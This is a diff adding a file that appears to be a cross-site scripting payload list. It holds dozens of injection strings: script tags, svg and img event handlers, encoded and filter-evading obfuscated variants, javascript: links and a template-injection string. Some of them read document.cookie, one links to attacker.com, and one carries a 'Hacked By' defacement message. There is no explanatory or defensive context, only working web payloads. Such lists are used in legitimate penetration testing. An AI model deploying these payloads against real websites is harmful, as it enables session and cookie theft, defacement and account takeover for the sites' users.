@@ -1,0 +1,45 @@
+<script>alert(“Hacked By DrSpitfire”)</script>“<script>alert(“Hacked By DrSpitfire”)</script>           
+“<script>alert(“Hacked By DrSpitfire”)</script>“<script>alert(“Hacked By DrSpitfire”)</script>
+xyz"><svg+onload=confirm(document.domain)>  
+/?q=C            
+"><svg onload=prompt(1)>
+&quot;&gt;&lt;svg onload=prompt(1)&gt;
+%2522%253E%253Csvg onload=prompt(1)%253E
+"><svg onload=prompt(1)
+"><img src=x onerror=alert&#0000000040document.cookie)> cf
+onerror=eval;throw'=alert\x28document\x2edomain\x29';
+[Click Me](javascript:alert('xss'))
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<div onwebkitanimationstart=prompt(document.domain)
+"><img src=x onerror=prompt(97);>
+"><img src=x onerror=prompt(document.cookie);>
+</span><svg onload=prompt(1)><span>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<img src="http://evanricafort.com/profile.png">
+<a href=”attacker.com”><h1><script>alert(2)</script><h1></a> 
+<inpuT autofocus oNFocus="setTimeout(function() { /*\*/top['al'+'\u0065'+'rt'](1)/*\*/ }, 5000);"></inpuT%3E;
+<Svg Only=1 OnLoad=confirm(1)>
+XSS"><body %00 onControl hello onmouseleave=confirm(domain) x>XSS
+XSS"><html><select %00 onControl onpointerenter=prompt(domain) hello>
+XSS"><input %00 onControl hello oninput=confirm(domain) x>
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+"><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">
+<svg onload=alert%26%230000000040"1")>
+"><img src=x onerror=alert(1)>,<script>alert(1)</script>
+<img  sr%00c=x o%00nerror=((pro%00mpt(1)))>
+<bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar;%20draggable=True>dragme
+<svg onload\r\n=$.globalEval("al"+"ert()");>
+<a href=&#01javascript:alert(1)>,<a href=javascript&colon;confirm(1)>
+<a href="jav%0Dascript&colon;alert(1)">
+"><svg/onload=prompt(8)>
+<a"/onclick=(confirm)()>click
+<d3v/onauxclick=[2].some(confirm)>click
+<x onauxclick=import('1')>click
+“><svg onmouseover=”confirm(1)”/>,<br size="&{alert("XSS")}">
+"> <BODY ONLOAD="a();"><SCRIPT>function a(){alert("XSS");}</SCRIPT><"
+<details ontoggle=alert(1)>,"/><marquee onfinish=confirm(123)>a</marquee>
+<INPUT TYPE="image" DYNSRC="javascript:alert("XSS");">
+{{constructor.constructor('alert(1)')()}}
+<video src=x onerror="prompt(xss)">
+">"><details/open/ontoggle=confirm('XSS')>
+<svg onload=prompt%26%230000000040document.domain)>
